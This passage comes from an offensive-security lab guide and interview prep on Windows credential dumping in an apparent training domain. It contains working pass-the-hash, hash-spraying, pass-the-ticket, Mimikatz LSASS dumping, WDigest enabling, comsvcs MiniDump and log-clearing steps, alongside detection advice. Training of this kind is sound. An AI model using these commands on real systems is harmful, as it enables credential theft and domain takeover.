## 11.2: Got NTLM Hash Only?

**Pass-the-Hash:**

```bash
# PSExec with hash
psexec.py -hashes :a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 orsubank.local/ammulu.orsu@DC01.orsubank.local

# Or crackmapexec
crackmapexec smb DC01.orsubank.local -u ammulu.orsu -H a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 -d orsubank.local
```

## 11.3: Got Local Admin Hash?

**Check if the hash works on other machines:**

```bash
# Spray the local admin hash across the network
crackmapexec smb 192.168.100.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth

# Any (Pwn3d!) = same local admin password!
```

## 11.4: Got Kerberos Tickets?

**Pass-the-Ticket:**

```bash
# Convert .kirbi to .ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Use ticket
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass DC01.orsubank.local
```

## 11.5: Attack Chain Summary

```
CREDENTIAL DUMPING → DOMAIN ADMIN:
────────────────────────────────────────────────────────────────

1. Initial Access
   └── vamsi.krishna on WS01 (Sliver implant)

2. Privilege Escalation
   └── getsystem → SYSTEM privileges

3. Credential Dumping
   └── AMSI bypass
   └── sekurlsa::logonpasswords
   └── Found ammulu.orsu (Domain Admin) cleartext!

4. Domain Compromise
   └── Used DA creds to DCSync
   └── Got Administrator and KRBTGT hashes

5. Persistence
   └── Golden Ticket with KRBTGT
   └── Shadow Admin accounts

Time: ~30 minutes
Detection: Medium (LSASS access logged)
```

---

# PART 12: Interview Questions {#part-12-interview}

## Q1: "Explain the LSASS process and why it's targeted for credential dumping."

**ANSWER:**
"LSASS (Local Security Authority Subsystem Service) is the core Windows security process that handles authentication and authorization.

It's targeted because:
1. **All authentication flows through LSASS** - It validates every login
2. **Credential caching for SSO** - Stores credentials so you don't re-enter passwords
3. **Multiple credential formats** - Contains NTLM hashes, Kerberos tickets, and potentially cleartext
4. **Domain credentials** - If a Domain Admin logs in to a machine, their credentials are cached in that machine's LSASS

LSASS loads Security Support Providers (SSPs) like msv1_0.dll (NTLM), kerberos.dll (Kerberos), and wdigest.dll. Each SSP maintains its own credential structures in LSASS memory.

Tools like Mimikatz open a handle to LSASS with PROCESS_VM_READ access, find the SSP credential structures, decrypt them using the LSA encryption keys also in memory, and extract the credentials."

---

## Q2: "What is WDigest and why is it important for attackers?"

**ANSWER:**
"WDigest is a Security Support Provider (SSP) used for HTTP Digest Authentication. It's important because it stores passwords in a reversible format - effectively cleartext.

**History:**
- HTTP Digest Auth requires the server to verify password without storing just the hash
- WDigest stores credentials in reversible encryption in LSASS memory
- Was enabled by default in Windows 7/2008 R2 and earlier

**Current state:**
- Disabled by default since Windows 8.1/2012 R2
- Controlled by registry: `HKLM\...\WDigest\UseLogonCredential`
- If set to 1, cleartext passwords appear in LSASS

**Attack technique:**
If I have admin access, I can enable WDigest, wait for a high-value user to log in (RDP, interactive), then dump LSASS. The user's cleartext password will be there.

Detection focuses on monitoring the UseLogonCredential registry key changes."

---

## Q3: "What's the difference between SAM, LSASS, and LSA Secrets?"

**ANSWER:**
"Three different credential storage locations:

**SAM (Security Accounts Manager):**
- Location: `C:\Windows\System32\config\SAM` (registry hive on disk)
- Contents: LOCAL user accounts only - Administrator, Guest, custom local users
- Format: NTLM hashes (encrypted with SYSKEY)
- Use case: Pass-the-Hash to machines with same local admin password

**LSASS (Local Security Authority Subsystem Service):**
- Location: Process memory (RAM)
- Contents: CURRENTLY LOGGED-IN users - both local and domain accounts
- Format: NTLM hashes, Kerberos tickets, cleartext (if WDigest enabled)
- Use case: Steal Domain Admin credentials if they've logged in

**LSA Secrets:**
- Location: `HKLM\SECURITY\Policy\Secrets` (registry, encrypted)
- Contents: Service account passwords, AutoLogon passwords, computer account password
- Format: Reversible encryption (effectively cleartext)
- Use case: Steal service account credentials, create Silver Tickets

The key difference: SAM = local accounts on disk, LSASS = logged-in users in memory, LSA Secrets = service/system credentials in registry."

---

## Q4: "How does Mimikatz extract credentials from LSASS?"

**ANSWER:**
"Mimikatz performs these steps:

1. **Acquire debug privilege:**
   `privilege::debug` requests SeDebugPrivilege, allowing read access to other processes' memory

2. **Open handle to LSASS:**
   OpenProcess() with PROCESS_VM_READ access

3. **Find SSP credential structures:**
   - Locates DLLs like msv1_0.dll, wdigest.dll in LSASS memory
   - Finds known data structures that hold credentials
   - Uses pattern matching and known offsets

4. **Find LSA encryption keys:**
   - LsaInitializeProtectedMemory keeps keys in LSASS
   - Mimikatz finds these keys in memory

5. **Decrypt credentials:**
   - Uses found keys to decrypt credential structures
   - 3DES or AES depending on Windows version

6. **Parse and display:**
   - Structures contain username, domain, hash, etc.
   - Formatted output shows all credentials

This is why LSASS protection (RunAsPPL) matters - it prevents non-Microsoft processes from opening that handle."

---

## Q5: "What is LSA Protection (RunAsPPL) and how can it be bypassed?"

**ANSWER:**
"LSA Protection is a Windows security feature that runs LSASS as a Protected Process Light (PPL).

**What it does:**
- Only signed Microsoft code can access LSASS memory
- Mimikatz/tools get 'Access Denied' even as SYSTEM
- Enabled via: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1`

**Bypass methods:**

1. **Mimidrv.sys (Kernel driver):**
   - Mimikatz includes a signed driver
   - Driver removes PPL flag from kernel memory
   - Risky: driver loading is noisy

2. **PPLdump / PPLKiller:**
   - Exploit vulnerabilities in PPL implementation
   - Use signed vulnerable drivers to disable protection

3. **Memory dump through boot:**
   - Boot from external media
   - SAM/Security hives can be accessed offline

4. **Credential Guard bypass:**
   - If Credential Guard enabled, credentials are in VSM
   - Some DPAPI-based attacks still work
   - Kerberos tickets may still be accessible

Modern attacks focus on avoiding LSASS entirely - using DCSync, Kerberoasting, or other network-based techniques."

---

## Q6: "What alternative methods exist for credential dumping?"

**ANSWER:**
"Beyond Mimikatz, several alternatives:

**Built-in Windows tools:**
- **comsvcs.dll MiniDump:** `rundll32 comsvcs.dll,MiniDump <PID> dump.dmp full`
- **Task Manager:** Right-click → Create dump file
- **procdump.exe:** Sysinternals tool, Microsoft signed

**Remote extraction:**
- **DCSync:** If you have Replicating Directory Changes rights
- **secretsdump.py:** Remote SAM/LSA dumping via SMB

**Memory dump analysis:**
- Create LSASS dump → transfer to attack machine
- Analyze with pypykatz or Mimikatz offline
- Avoids in-memory detection

**Registry extraction:**
- SAM and SECURITY hives via reg save
- Decrypt offline with secretsdump.py

**Custom tools:**
- Nanodump: Direct syscalls, obfuscated
- HandleKatz: Clone handle from other process
- SafetyKatz: Modified, obfuscated Mimikatz

Each has different detection profiles. I choose based on target's EDR capabilities."

---

## Q7: "How would you detect credential dumping in an environment?"

**ANSWER:**
"Multi-layered detection approach:

**Process Monitoring:**
- Event ID 4656/4663: Handle access to LSASS
- Alert on PROCESS_VM_READ access to lsass.exe
- Watch for unusual processes accessing LSASS

**Command Line Monitoring:**
- sekurlsa::, lsadump::, privilege::debug
- MiniDump commands, procdump with lsass

**Sysmon:**
- Event ID 10: Process Access to LSASS
- Event ID 8: CreateRemoteThread into LSASS
- Event ID 7: Image loaded into LSASS (malicious DLL)

**File System:**
- lsass.dmp file creation
- Files in temp directories

**Registry:**
- UseLogonCredential changes
- RunAsPPL modifications

**Network:**
- DCSync replication traffic from non-DC
- SMB access to SAM/SECURITY remotely

**EDR-specific:**
- Direct syscall detection
- Memory scanning for Mimikatz signatures
- Behavior-based detection of credential theft patterns

The most reliable is protecting LSASS (Credential Guard, RunAsPPL) combined with monitoring for any access attempts."

---

## Q8: "What is the significance of the NTLM hash?"

**ANSWER:**
"The NTLM hash is a hash of the user's password used in Windows authentication:

**Technical details:**
- Algorithm: MD4(UTF-16LE(password))
- 32 hexadecimal characters (128-bit)
- No salt (same password = same hash across all systems)

**Why it's significant:**

1. **Pass-the-Hash:**
   NTLM authentication accepts the hash directly - no need to know plaintext. If I have the hash, I can authenticate as that user.

2. **Fast to crack:**
   MD4 is very fast - ~35 billion guesses/sec on GPU. Short passwords crack quickly.

3. **Credential equivalence:**
   Having the hash is basically the same as having the password for Windows auth purposes.

4. **Lateral movement:**
   Local admin hashes are often identical across machines. One hash = access to many systems.

**Attacks using NTLM:**
- Pass-the-Hash (PtH)
- NTLM relay attacks
- Pass-the-Key (AES key derivation)
- Cracking to plaintext

This is why password length matters so much - and why credential protection (Credential Guard) moves hashes to isolated memory."

---

## Q9: "Walk me through a credential dumping attack from start to finish."

**ANSWER:**
"End-to-end credential dumping scenario:

**1. Context:** I have Sliver implant on WS01 as regular domain user

**2. Check current context:**
```
whoami /priv  # Check if I have admin rights
```

**3. Escalate if needed:**
```
getsystem  # Or local privilege escalation
```

**4. AMSI bypass:**
```
execute -o powershell.exe -Command '[AMSI bypass]'
```

**5. Initial dump (LSASS):**
```
execute-assembly Mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'
```

**6. Analyze output:**
- Look for Domain Admins, privileged service accounts
- Note NTLM hashes and any cleartext passwords
- Check Kerberos tickets

**7. If DA found - verify credentials:**
```
crackmapexec smb DC01 -u da_user -p 'password' -d domain
```

**8. If only hash - Pass-the-Hash:**
```
psexec.py -hashes :hash domain/da_user@DC01
```

**9. DCSync for persistence:**
```
secretsdump.py domain/da_user:password@DC01
```

**10. Cleanup:**
- Clear event logs (if needed)
- Remove any files created

The goal: Find a path to Domain Admin through cached credentials."

---

## Q10: "How does Credential Guard protect against credential dumping?"

**ANSWER:**
"Credential Guard uses virtualization-based security (VBS) to isolate credentials:

**How it works:**
1. Creates isolated Virtual Secure Mode (VSM) container
2. LSAIso.exe runs in this isolated environment
3. Credential secrets (NTLM hashes, Kerberos keys) stored in VSM
4. Main LSASS only gets 'handles' to credentials, not actual values

**Protection provided:**
- Mimikatz can't read VSM memory (different VM)
- Even SYSTEM/kernel can't access VSM directly
- Pass-the-Hash requires the actual hash, not just handles

**Limitations:**
1. Only protects NTLM and Kerberos long-term secrets
2. Cached tickets may still be accessible
3. DPAPI secrets not protected
4. Application passwords (WDigest-style) may bypass
5. Requires UEFI, TPM 2.0, Secure Boot

**Attack considerations:**
- Look for systems without Credential Guard
- Target applications that store passwords outside LSASS
- Use network-based attacks (Kerberoasting, DCSync)
- Access cached Kerberos tickets (may still work)
- DPAPI attacks for saved credentials

Credential Guard significantly raises the bar but doesn't eliminate all credential theft vectors."

---

# PART 13: Troubleshooting {#part-13-troubleshoot}

## 13.1: "Access Denied" Even as SYSTEM

**Likely LSA Protection (RunAsPPL) is enabled:**
```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL
```

**Options:**
- Use mimidrv.sys (risky)
- Use comsvcs.dll dump + offline analysis
- Try different extraction method

## 13.2: WDigest Returns "(null)" for Password

**WDigest is disabled (default on modern Windows):**
```powershell
# Check current setting
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential

# Enable (requires admin)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

**Note:** User must RE-LOGON for cleartext to appear!

## 13.3: No Domain Admin Found in LSASS

**No DA has logged into this machine recently.**

**Options:**
- RDP/PSRemote to a server where DAs log in (DC, file server)
- Wait and maintain persistence
- Try other techniques (Kerberoasting, DCSync if you have rights)

## 13.4: Mimikatz Blocked by Defender

**AMSI bypass didn't work or AV still detecting:**

```bash
# Alternative: comsvcs.dll dump (built-in, less detected)
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> dump.dmp full

# Or use Sliver's built-in hashdump
sliver > hashdump
```

## 13.5: Dump File Too Large to Download

**Compress before exfiltration:**
```powershell
Compress-Archive -Path C:\temp\lsass.dmp -DestinationPath C:\temp\dump.zip
```

---

# ✅ VERIFICATION CHECKLIST

- [ ] Understand LSASS role in Windows authentication
- [ ] Know difference between SAM, LSASS, LSA Secrets
- [ ] Know what WDigest is and how to enable it
- [ ] Ran Enable-CredentialExposure.ps1
- [ ] Applied AMSI bypass in Sliver
- [ ] Elevated to SYSTEM (getsystem)
- [ ] Dumped SAM → Got local admin hash
- [ ] Dumped LSASS → Found domain user credentials
- [ ] Verified credentials work
- [ ] Can answer all 10 interview questions

---

# 🔗 Next Steps

**Got Domain Admin credentials?**
→ **[04b. DCSync](./04b_dcsync_attack.md)** - Dump ALL domain hashes
→ **[07. Golden Ticket](./07_golden_ticket.md)** - Persistent access

**Got Local Admin hash only?**
→ **[06. Pass-the-Hash](./06_pass_the_hash.md)** - Lateral movement

**Got Kerberos tickets?**
→ **[06b. Pass-the-Ticket](./06b_pass_the_ticket.md)** - Session hijacking

**Need to escalate further first?**
→ **[05. ACL Abuse](./05_acl_abuse.md)** - Abuse AD permissions

---

**MITRE ATT&CK Mapping:**

| Technique | ID | Description |
|-----------|-----|-------------|
| OS Credential Dumping: LSASS Memory | T1003.001 | sekurlsa::logonpasswords |
| OS Credential Dumping: SAM | T1003.002 | lsadump::sam |
| OS Credential Dumping: LSA Secrets | T1003.004 | lsadump::secrets |
| OS Credential Dumping: Cached Domain Creds | T1003.005 | Cached logon credentials |

---

**Interview Importance:** ⭐⭐⭐⭐⭐ (THE most asked topic in AD interviews)

